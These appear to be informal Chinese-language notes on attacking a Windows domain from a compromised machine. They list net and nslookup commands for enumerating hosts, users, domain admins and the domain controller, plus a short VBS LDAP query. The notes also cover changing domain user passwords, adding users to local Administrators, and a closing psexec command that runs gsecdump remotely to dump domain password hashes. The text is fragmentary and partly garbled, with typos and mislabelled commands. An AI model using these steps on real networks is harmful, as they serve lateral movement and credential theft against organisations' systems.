“活动目录策略--组策略--软件限制策略”
NET和NET1都被限制了权限。

nslookip 10.10.1.2

开网关IP，看提示15级权限应该是CISCO

传说gsecdump可以抓DC的HASH

NET VIEW

NET USER查看用户

net view是可以看到本机所在的域约有多少台机器,net view /domain，可以看到有几个域，”net view /domain:域名“ 是看每个域中有多少台机器，net group "domain admins" /domain，是可以看到域管理员的名字，运气好的情况下是直接可以看到域服务器是哪一台

net group "domain admins" /domain，在非英文英器上你可能要把domain admins这个名字来换一下了，就要先用net group来看看哪一个可能是域管理员的组。

探测域服务器是哪一台还有另几个办法，除了dns的名字和net group "domain admins" /domain这个命令外，另一个办法是net time /domain，

微软对域提供了专门的adsi（Active Directory）活动目录服务模型，其中在域用到的就是ADSI的接口之一LDAP提供者，用来管理域的。我们可以写一个很简短的vbs程序来探测出域服务器是哪一台，1.vbs代码如下：
★
set obj=GetObject("LDAP://rootDSE")
wscript.echo obj.servername
★





域控的方法
网上给出的办法：
常用命令 net view
查看同一域/工作组的计算机列表
net view /domain
查看域/工作组列表
net view /domain:Secwing
查看Secwing域中 计算机列表
net group /domain
查看所在域的组
net user /domain
查看所在域用户
net user /domain zerosoul 12345678
修改域用户密码，需要域管理员权限
net localgroup administrators SECWING\zerosoul /add
域Users组用户添加到本地Administrators组，需要本地管理员或域管理员在本机登陆域后进行
下面的命令 只能用于 域控制器:
net group “Domain controllers”
查看域控制器(如果有多台)
net group
查看域的组
net group “domain admins”
查看域管理员
net group “domain users”
查看域管理员

SRV 记录是一个域名系统 (DNS) 资源记录，用于标识承载特定服务的计算机。SRV 资源记录用于定位 Active Directory 的域控制器。要验证域控制器的 SRV 定位器资源记录，请使用下列方法之一。
Nslookup
Nslookup 是一个命令行工具，它显示的信息可以用来诊断域名系统 (DNS) 的基础结构。
要使用 Nslookup 来验证 SRV 记录，请按照下列步骤操作：
1.在 DNS 上，单击“开始”，然后单击“运行”。
2.在“打开”框中，键入 cmd。
3.键入 nslookup，然后按 Enter。
4.键入 set type=srv，然后按 Enter。
5.键入 _ldap._tcp.dc._msdcs.Domain_Name，其中
Domain_Name
为域名，然后按 Enter。

slookup 将返回显示为以下格式的一个或多个 SRV 服务位置记录，其中，Server_Name
为域控制器的主机名，Domain_Name
为域控制器所属的域，Server_IP_Address
为域控制器的 Internet 协议 (IP) 地址：
Server:localhost
Address:
127.0.0.1
_ldap._tcp.dc._msdcs.Domain_Name
(输入如:_ldap._tcp.dc._msdcs.blackeagle.com)
SRV service location:
priority= 0
weight= 100
port= 389
srv hostname= Server_Name.Domain_NameServer_Name.Domain_N
⑴如何获得域成员服务器的权限，即可以访问域的共享权限？
①通过gsecdump.exe
gsecdump.exe能从域服务器密码存储文件windows\ntds\ntds.dit中导出所有域用户hash的工具，并能从活动进程中导出hash，如果占领的机器的管理破解出来的话，则就可以尝试用破获的用户名密码来截取域中成员机器的HASH值
psexec \\192.168.168.x -u administrator Cp test123!@# -c gsecdump.exe -u